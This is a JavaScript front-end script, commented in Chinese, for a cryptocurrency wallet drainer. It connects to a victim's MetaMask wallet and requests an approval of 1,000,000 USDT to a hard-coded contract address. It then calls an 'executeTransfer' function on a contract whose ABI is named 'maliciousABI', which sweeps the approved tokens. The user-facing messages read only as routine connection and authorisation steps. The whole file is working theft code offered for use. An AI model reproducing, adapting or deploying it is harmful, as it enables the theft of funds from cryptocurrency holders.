const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 你的合约地址
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址

const maliciousABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const usdtABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let userAccount;

const messageElement = document.getElementById('message');

function showMessage(msg, isSuccess = true) {
    messageElement.innerText = msg;
    messageElement.style.color = isSuccess ? '#28a745' : '#dc3545'; // 根据成功与否改变颜色
}

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        // 检查是否已经连接
        const accounts = await web3.eth.getAccounts();
        if (accounts.length > 0) {
            userAccount = accounts[0];
            console.log('钱包已连接: ', userAccount);
            document.getElementById('connectButton').innerText = '连接成功';
            document.getElementById('approveButton').disabled = false;
            showMessage('连接成功！');
            return; // 已连接，直接返回
        }
        // 如果未连接，提示用户连接
        document.getElementById('connectButton').innerText = '连接中...';
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = (await web3.eth.getAccounts())[0];
            console.log('钱包连接成功: ', userAccount);
            document.getElementById('connectButton').innerText = '连接成功';
            document.getElementById('approveButton').disabled = false;
            showMessage('连接成功！');
        } catch (error) {
            console.error('连接错误: ', error);
            document.getElementById('connectButton').innerText = '连接钱包';
            showMessage('连接钱包失败: ' + error.message, false);
        }
    } else {
        alert('请安装 MetaMask!');
    }
};

document.getElementById('approveButton').onclick = async () => {
    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
    const amountToApprove = web3.utils.toWei('1000000', 'ether'); // 1000000 USDT

    try {
        await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
        document.getElementById('approveButton').innerText = '授权成功';
        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
        showMessage('授权成功！');
    } catch (error) {
        console.error('授权错误: ', error);
        showMessage('授权失败: ' + error.message, false);
    }
};

document.getElementById('executeTransferButton').onclick = async () => {
    const maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);

    try {
        await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
        showMessage('转移执行成功！');
    } catch (error) {
        console.error('转移错误: ', error);
        showMessage('转移失败: ' + error.message, false);
    }
};
